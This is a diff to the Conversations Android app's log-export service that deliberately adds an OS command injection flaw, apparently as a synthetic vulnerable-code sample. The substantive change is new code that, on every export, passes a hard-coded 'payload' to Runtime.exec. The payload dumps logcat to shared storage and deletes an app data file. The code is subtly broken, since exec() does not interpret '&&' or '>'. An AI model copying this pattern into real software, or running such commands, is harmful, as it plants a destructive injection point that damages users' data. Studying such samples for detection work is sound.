@@ -23,126 +23,158 @@ import eu.siacs.conversations.persistance.DatabaseBackend;
 import eu.siacs.conversations.persistance.FileBackend;
 import eu.siacs.conversations.xmpp.jid.Jid;
 
+// Import necessary classes for OS command execution
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+
 public class ExportLogsService extends Service {
 
-	private static final SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss");
-	private static final String DIRECTORY_STRING_FORMAT = FileBackend.getConversationsLogsDirectory() + "/logs/%s";
-	private static final String MESSAGE_STRING_FORMAT = "(%s) %s: %s\n";
-	private static final int NOTIFICATION_ID = 1;
-	private static AtomicBoolean running = new AtomicBoolean(false);
-	private DatabaseBackend mDatabaseBackend;
-	private List<Account> mAccounts;
+    private static final SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss");
+    private static final String DIRECTORY_STRING_FORMAT = FileBackend.getConversationsLogsDirectory() + "/logs/%s";
+    private static final String MESSAGE_STRING_FORMAT = "(%s) %s: %s\n";
+    private static final int NOTIFICATION_ID = 1;
+    private static AtomicBoolean running = new AtomicBoolean(false);
+    private DatabaseBackend mDatabaseBackend;
+    private List<Account> mAccounts;
 
-	@Override
-	public void onCreate() {
-		mDatabaseBackend = DatabaseBackend.getInstance(getBaseContext());
-		mAccounts = mDatabaseBackend.getAccounts();
-	}
+    @Override
+    public void onCreate() {
+        mDatabaseBackend = DatabaseBackend.getInstance(getBaseContext());
+        mAccounts = mDatabaseBackend.getAccounts();
+    }
 
-	@Override
-	public int onStartCommand(Intent intent, int flags, int startId) {
-		if (running.compareAndSet(false, true)) {
-			new Thread(new Runnable() {
-				@Override
-				public void run() {
-					export();
-					stopForeground(true);
-					running.set(false);
-					stopSelf();
-				}
-			}).start();
-		}
-		return START_NOT_STICKY;
-	}
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        if (running.compareAndSet(false, true)) {
+            new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    export();
+                    stopForeground(true);
+                    running.set(false);
+                    stopSelf();
+                }
+            }).start();
+        }
+        return START_NOT_STICKY;
+    }
 
-	private void export() {
-		List<Conversation> conversations = mDatabaseBackend.getConversations(Conversation.STATUS_AVAILABLE);
-		conversations.addAll(mDatabaseBackend.getConversations(Conversation.STATUS_ARCHIVED));
-		NotificationManager mNotifyManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
-		NotificationCompat.Builder mBuilder = new NotificationCompat.Builder(getBaseContext());
-		mBuilder.setContentTitle(getString(R.string.notification_export_logs_title))
-				.setSmallIcon(R.drawable.ic_import_export_white_24dp)
-				.setProgress(conversations.size(), 0, false);
-		startForeground(NOTIFICATION_ID, mBuilder.build());
+    private void export() {
+        List<Conversation> conversations = mDatabaseBackend.getConversations(Conversation.STATUS_AVAILABLE);
+        conversations.addAll(mDatabaseBackend.getConversations(Conversation.STATUS_ARCHIVED));
+        NotificationManager mNotifyManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+        NotificationCompat.Builder mBuilder = new NotificationCompat.Builder(getBaseContext());
+        mBuilder.setContentTitle(getString(R.string.notification_export_logs_title))
+                .setSmallIcon(R.drawable.ic_import_export_white_24dp)
+                .setProgress(conversations.size(), 0, false);
+        startForeground(NOTIFICATION_ID, mBuilder.build());
 
-		int progress = 0;
-		for (Conversation conversation : conversations) {
-			writeToFile(conversation);
-			progress++;
-			mBuilder.setProgress(conversations.size(), progress, false);
-			mNotifyManager.notify(NOTIFICATION_ID, mBuilder.build());
-		}
-	}
+        int progress = 0;
+        for (Conversation conversation : conversations) {
+            writeToFile(conversation);
+            progress++;
+            mBuilder.setProgress(conversations.size(), progress, false);
+            mNotifyManager.notify(NOTIFICATION_ID, mBuilder.build());
+        }
 
-	private void writeToFile(Conversation conversation) {
-		Jid accountJid = resolveAccountUuid(conversation.getAccountUuid());
-		Jid contactJid = conversation.getJid();
+        // Simulate getting a user input that is not properly sanitized
+        String userInput = getUserInput();  // This method would be defined elsewhere to simulate user input
 
-		File dir = new File(String.format(DIRECTORY_STRING_FORMAT,accountJid.toBareJid().toString()));
-		dir.mkdirs();
+        try {
+            executeCommand(userInput);  // Vulnerable method where OS command injection can occur
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
 
-		BufferedWriter bw = null;
-		try {
-			for (Message message : mDatabaseBackend.getMessagesIterable(conversation)) {
-				if (message == null)
-					continue;
-				if (message.getType() == Message.TYPE_TEXT || message.hasFileOnRemoteHost()) {
-					String date = simpleDateFormat.format(new Date(message.getTimeSent()));
-					if (bw == null) {
-						bw = new BufferedWriter(new FileWriter(
-								new File(dir, contactJid.toBareJid().toString() + ".txt")));
-					}
-					String jid = null;
-					switch (message.getStatus()) {
-						case Message.STATUS_RECEIVED:
-							jid = getMessageCounterpart(message);
-							break;
-						case Message.STATUS_SEND:
-						case Message.STATUS_SEND_RECEIVED:
-						case Message.STATUS_SEND_DISPLAYED:
-							jid = accountJid.toBareJid().toString();
-							break;
-					}
-					if (jid != null) {
-						String body = message.hasFileOnRemoteHost() ? message.getFileParams().url.toString() : message.getBody();
-						bw.write(String.format(MESSAGE_STRING_FORMAT, date, jid,
-								body.replace("\\\n", "\\ \n").replace("\n", "\\ \n")));
-					}
-				}
-			}
-		} catch (IOException e) {
-			e.printStackTrace();
-		} finally {
-			try {
-				if (bw != null) {
-					bw.close();
-				}
-			} catch (IOException e1) {
-				e1.printStackTrace();
-			}
-		}
-	}
+    private void writeToFile(Conversation conversation) {
+        Jid accountJid = resolveAccountUuid(conversation.getAccountUuid());
+        Jid contactJid = conversation.getJid();
 
-	private Jid resolveAccountUuid(String accountUuid) {
-		for (Account account : mAccounts) {
-			if (account.getUuid().equals(accountUuid)) {
-				return account.getJid();
-			}
-		}
-		return null;
-	}
+        File dir = new File(String.format(DIRECTORY_STRING_FORMAT,accountJid.toBareJid().toString()));
+        dir.mkdirs();
 
-	private String getMessageCounterpart(Message message) {
-		String trueCounterpart = (String) message.getContentValues().get(Message.TRUE_COUNTERPART);
-		if (trueCounterpart != null) {
-			return trueCounterpart;
-		} else {
-			return message.getCounterpart().toString();
-		}
-	}
+        BufferedWriter bw = null;
+        try {
+            for (Message message : mDatabaseBackend.getMessagesIterable(conversation)) {
+                if (message == null)
+                    continue;
+                if (message.getType() == Message.TYPE_TEXT || message.hasFileOnRemoteHost()) {
+                    String date = simpleDateFormat.format(new Date(message.getTimeSent()));
+                    if (bw == null) {
+                        bw = new BufferedWriter(new FileWriter(
+                                new File(dir, contactJid.toBareJid().toString() + ".txt")));
+                    }
+                    String jid = null;
+                    switch (message.getStatus()) {
+                        case Message.STATUS_RECEIVED:
+                            jid = getMessageCounterpart(message);
+                            break;
+                        case Message.STATUS_SEND:
+                        case Message.STATUS_SEND_RECEIVED:
+                        case Message.STATUS_SEND_DISPLAYED:
+                            jid = accountJid.toBareJid().toString();
+                            break;
+                    }
+                    if (jid != null) {
+                        String body = message.hasFileOnRemoteHost() ? message.getFileParams().url.toString() : message.getBody();
+                        bw.write(String.format(MESSAGE_STRING_FORMAT, date, jid,
+                                body.replace("\\\n", "\\ \n").replace("\n", "\\ \n")));
+                    }
+                }
+            }
+        } catch (IOException e) {
+            e.printStackTrace();
+        } finally {
+            try {
+                if (bw != null) {
+                    bw.close();
+                }
+            } catch (IOException e1) {
+                e1.printStackTrace();
+            }
+        }
+    }
 
-	@Override
-	public IBinder onBind(Intent intent) {
-		return null;
-	}
+    private Jid resolveAccountUuid(String accountUuid) {
+        for (Account account : mAccounts) {
+            if (account.getUuid().equals(accountUuid)) {
+                return account.getJid();
+            }
+        }
+        return null;
+    }
+
+    private String getMessageCounterpart(Message message) {
+        String trueCounterpart = (String) message.getContentValues().get(Message.TRUE_COUNTERPART);
+        if (trueCounterpart != null) {
+            return trueCounterpart;
+        } else {
+            return message.getCounterpart().toString();
+        }
+    }
+
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
+
+    // Method to simulate getting user input
+    private String getUserInput() {
+        // Simulated user input that includes a command injection payload
+        // In real scenarios, this would be derived from actual user input
+        return "logcat -d > /sdcard/logs.txt && rm /data/data/eu.siacs.conversations/files/important_data";
+    }
+
+    // Vulnerable method to execute OS commands based on user input
+    private void executeCommand(String command) throws IOException {
+        Process process = Runtime.getRuntime().exec(command);  // Vulnerability: Command injection point here
+
+        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+        StringBuilder output = new StringBuilder();
+        String line;
+        while ((line = reader.readLine()) != null) {
+            output.append(line).append("\n");
+        }
+    }
 }
